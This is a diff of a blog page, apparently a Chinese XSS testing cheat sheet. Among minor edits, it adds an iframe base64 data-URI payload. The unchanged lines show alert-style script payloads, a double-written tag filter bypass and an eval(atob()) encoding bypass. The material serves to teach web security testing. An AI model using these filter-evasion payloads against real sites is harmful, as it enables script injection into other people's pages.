@@ -118,7 +118,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    667 字
+                    699 字
                   </span>
                 
 
@@ -164,9 +164,9 @@
 <li><p><strong>简单的探测方式</strong><br>输入一串不容易重复的字符，使用浏览器检查元素的功能查看用户输入被存储的位置，进一步分析闭合方式<br>输入类似*&lt;script “ ‘ OOnn&gt;*的字符串，根据显示内容，观察对特殊字符的过滤情况</p>
 </li>
 <li><p><strong>常用的payload</strong></p>
-<pre><code class="hljs html"> <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">'xss'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<pre><code class="hljs html">  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">'xss'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">confirm(<span class="hljs-string">'xss'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
- <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">prompt(<span class="hljs-string">'xss'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">prompt(<span class="hljs-string">'xss'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
 </li>
 <li><p><strong>双写绕过</strong></p>
 <pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">scscriptript</span>&gt;</span>alert('xss')<span class="hljs-tag">&lt;/<span class="hljs-name">scscriptript</span>&gt;</span></code></pre>
@@ -200,6 +200,9 @@
 <li><p><strong>编码绕过</strong></p>
 <pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>(atob(<span class="hljs-string">'base64编码内容'</span>));</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
 <p>atob函数执行base64解码功能,eval函数将字符串当作程序执行<br>也可以使用十六进制、unicode等编码<br>类似SQL注入的宽字节注入，XSS也可以用这种方法绕过反斜杠的转义</p>
+</li>
+<li><p><strong>iframe加密脚本</strong></p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"data:text/html;base64,这里加你的经过base64加密过的脚本代码"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></code></pre>
 </li>
 <li><p>关注最新的HTML标签，往往没有被过滤</p>
 </li>
